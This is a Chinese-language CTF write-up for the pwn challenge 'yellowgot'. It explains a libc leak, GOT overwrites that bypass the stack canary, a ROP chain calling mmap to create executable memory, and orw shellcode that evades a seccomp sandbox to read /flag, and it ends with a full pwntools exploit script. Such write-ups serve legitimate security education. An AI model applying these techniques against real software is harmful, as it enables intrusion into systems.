---
title: "[HNCTF 2022 WEEK2]yellowgot Writeup"
date: 2026-09-29T23:30:00+08:00
categories:
  - pwn
tags:
  - pwn
  - GOT 劫持
  - seccomp
  - ret2shellcode
  - HNCTF
---

# [HNCTF 2022 WEEK2]yellowgot Writeup

>  **特别感谢ret2z大手子的支持！我要打一辈子的pwn😭😭😭**



-----------------



> 奇怪的got表
> hint：试着观察一下`atoi`函数的参数数量及其特点，修改`atoi`函数的got表

<!-- more -->

## 题目分析与攻击思路

先查看题目保护

![image-20260927235814819](/img/yellowgot/image-20260927235814819.png)

题目未开启PIE，有canary，Partial RELRO代表got表可写

到IDA里反汇编

```c
//main
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-18h]
  int v5; // [rsp+Ch] [rbp-14h]
  char *s; // [rsp+10h] [rbp-10h]
  void *buf; // [rsp+18h] [rbp-8h]

  setbuf(stdin, 0);
  setbuf(stderr, 0);
  setbuf(stdout, 0);
  sandbox();
  for ( i = 0; i <= 3; ++i )
  {
    v5 = menu();
    switch ( v5 )
    {
      case 1:
        buf = (void *)getaddr();
        puts("Value: ");
        read(0, buf, 4u);
        break;
      case 2:
        s = (char *)getaddr();
        puts("Value: ");
        puts(s);
        break;
      case 3:
        puts("Good bye.");
        exit(0);
      default:
        puts("Invalid.");
        break;
    }
  }
  return 0;
}
```

```C
//menu
int menu()
{
  puts("1.change.");
  puts("2.leak.");
  puts("3.exit.");
  return getnumber();
}
```

```C
//getnumber
int getnumber()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0x10u);
  return atoi(buf);
}
```

可以得出如下信息：

- 题目开启了沙箱
- 通过2.leak.泄露地址，根据题目提供的libc.so.6文件可以计算出libc基址
- 根据hint可知，通过1.change.修改got表

首先查看沙箱

![image-20260928000311686](/img/yellowgot/image-20260928000311686.png)

可以得出如下关键信息：

- 题目启用了`open`，`read`，`write`，`execve`不可用，需要使用orw技术
- 题目启用了fd限制，`read`的文件描述符必须是0，而在传统orw中，调用`open`过后`read`的文件描述符通常为3。Linux 内核在分配文件描述符时遵循一个简单规则：**总是返回当前进程中最小的、未被使用的文件描述符**。因此我们需要先关闭标准输入（fd 0），然后打开 flag 文件，让 `open` 返回 fd 0
- 题目启用了`mmap`，这意味着我们可以调用`mmap`去开辟一段可执行的空间写入shellcode

现在我们有了两种思路：一、构造ROP链进行orw。二、ret2shellcode。而在现代版本的libc中，`open` 的 glibc 包装函数使用了 `openat` 系统调用，而非内核的 `open` 系统调用，**如果我们通过构造ROP链进行`open`的调用，我们实际上是调用了`openat`，会被沙箱直接KELL**。因此，我们使用ret2shellcode。

exp总体思路如下：

- 泄露libc_base
- 修改`__stack_chk_fail`的got表以绕过canary
- 修改`atoi`的got表为`gets`
- `mmap`开辟一段可执行的空间
- 注入shellcode进行orw

### Stage1：泄露libc_base

```python
puts_got = elf.got['puts']
p.sendafter(b'Address:\n', str(puts_got))
p.recvuntil(b'Value: \n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts : {hex(puts_addr)}')
libc_base = puts_addr - libc.sym['puts']
log.info(f'libc_base : {hex(libc_base)}')
```

这一段思路显然，不再赘述。

### Stage2：修改got表

我们修改got表的目的有两个

- 修改`__stack_chk_fail`的got表以绕过canary
- 修改`atoi`的got表为`gets`，开辟一段可执行空间注入orw_shellcode

要绕过canary且不造成其他的任何影响，我们可以将`__stack_chk_fail`修改为`puts`。

注意到，我们只能修改got表的四个字节。这就出现了一个问题：应该修改为目标函数的真实地址，还是修改为plt桩地址？

要回答这个问题，需要对**延迟绑定**机制有大概的了解。

- `__stack_chk_fail`在修改前没有被调用过，其got表内存储的是**PLT 条目中“下一条指令”的地址**，在覆盖时，要选择`puts`函数的plt桩地址
- `atoi`在修改前已被调用过，其got表内存储的是函数真实地址，在覆盖时，就要选择`gets`函数的真实地址

如下

```python
p.sendlineafter(b'exit.\n', b'1')
stack_got = elf.got['__stack_chk_fail']
p.sendafter(b'Address:\n', str(stack_got))
p.sendafter(b'Value: \n', p32(elf.sym['puts'] & 0xffffffff))

p.sendlineafter(b'exit.\n', b'1')
atoi_got = elf.got['atoi']
gets = libc_base + libc.sym['gets']
p.sendafter(b'Address:\n', str(atoi_got))
p.sendafter(b'Value: \n', p32(gets & 0xffffffff))
```

### Stage3：开辟可执行空间并写入orw_shellcode

`mmap`函数的参数如下

```C
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

| 参数       | 寄存器 | 常用取值                                                     |
| :--------- | :----- | :----------------------------------------------------------- |
| 系统调用号 | `rax`  | `9`（`__NR_mmap`）                                           |
| `addr`     | `rdi`  | `0` / `NULL` / `0x10000`                                     |
| `length`   | `rsi`  | `0x1000`、`0x2000` 等映射长度                                |
| `prot`     | `rdx`  | `rwxp=7`                                                     |
| `flags`    | `r10`  | `MAP_PRIVATE=2`、`MAP_ANONYMOUS=0x20`；常用 `0x22`；`MAP_SHARED=1` |
| `fd`       | `r8`   | 匿名映射常用 `-1`；文件映射传文件描述符                      |
| `offset`   | `r9`   | 匿名映射常用 `0`；文件映射需页对齐                           |
| 返回值     | `rax`  | 成功：映射起始地址；失败：`-1`，并设置 `errno`               |

常规ROP链构造，不再赘述

```python
#mmap to ret2shellcode!!!
rdi = 0x4016a3
rsi_r15 = 0x4016a1
rdx_r12 = libc_base + 0x11f497
rcx = libc_base + 0x8c6bb

ret = 0x40101a
bss = 0x404000

read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
open = libc_base + libc.sym['open']
mmap = libc_base + libc.sym['mmap']

p.send(b'a' * 0x10)

payload = b'a' * 0x28
payload += p64(rdi) + p64(bss) + p64(gets)    #to input '/flag\x00'
payload += p64(rdi) + p64(0x10000) + p64(rsi_r15) + p64(0x1000) + p64(0) + p64(rdx_r12) + p64(7) + p64(0) + p64(rcx) + p64(0x22) + p64(mmap)   #mmap
payload += p64(rdi) + p64(0x10000) + p64(gets) + p64(0x10000)     #get shellcode & ret2shellcode

p.sendline(payload)
p.sendline(b'/flag\x00')

shellcode = shellcraft.close(0)
shellcode += shellcraft.open(bss, 0)
shellcode += shellcraft.read('rax', bss + 0x500, 100)
shellcode += shellcraft.write(1, bss + 0x500, 100)
```

完整exp如下

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#p = remote("node4.anna.nssctf.cn", 21634)
p = process("./yellowgot")
libc = ELF("./libc.so.6")
elf = ELF("./yellowgot")

#gdb.attach(p)
p.sendlineafter(b'exit.\n', b'2')
#----leak puts & base-----
puts_got = elf.got['puts']
p.sendafter(b'Address:\n', str(puts_got))
p.recvuntil(b'Value: \n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts : {hex(puts_addr)}')
libc_base = puts_addr - libc.sym['puts']
log.info(f'libc_base : {hex(libc_base)}')

p.sendlineafter(b'exit.\n', b'1')
stack_got = elf.got['__stack_chk_fail']
p.sendafter(b'Address:\n', str(stack_got))
p.sendafter(b'Value: \n', p32(elf.sym['puts'] & 0xffffffff))

p.sendlineafter(b'exit.\n', b'1')
atoi_got = elf.got['atoi']
gets = libc_base + libc.sym['gets']
p.sendafter(b'Address:\n', str(atoi_got))
p.sendafter(b'Value: \n', p32(gets & 0xffffffff))

#mmap to ret2shellcode!!!
rdi = 0x4016a3
rsi_r15 = 0x4016a1
rdx_r12 = libc_base + 0x11f497
rcx = libc_base + 0x8c6bb

ret = 0x40101a
bss = 0x404000

read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
open = libc_base + libc.sym['open']
mmap = libc_base + libc.sym['mmap']

p.send(b'a' * 0x10)

payload = b'a' * 0x28
payload += p64(rdi) + p64(bss) + p64(gets)    #to input '/flag\x00'
payload += p64(rdi) + p64(0x10000) + p64(rsi_r15) + p64(0x1000) + p64(0) + p64(rdx_r12) + p64(7) + p64(0) + p64(rcx) + p64(0x22) + p64(mmap)   #mmap
payload += p64(rdi) + p64(0x10000) + p64(gets) + p64(0x10000)     #get shellcode & ret2shellcode

p.sendline(payload)
p.sendline(b'/flag\x00')

shellcode = shellcraft.close(0)
shellcode += shellcraft.open(bss, 0)
shellcode += shellcraft.read('rax', bss + 0x500, 100)
shellcode += shellcraft.write(1, bss + 0x500, 100)

p.sendline(asm(shellcode))

p.interactive()
```

## 总结

- 该题在修改got表时需要注意区分函数是否被调用，算是一处细节
- 该题提供了另一种canary绕过思路，值得学习
- 该题采取自行构造ROP链开辟可执行空间的思路，值得学习并举一反三
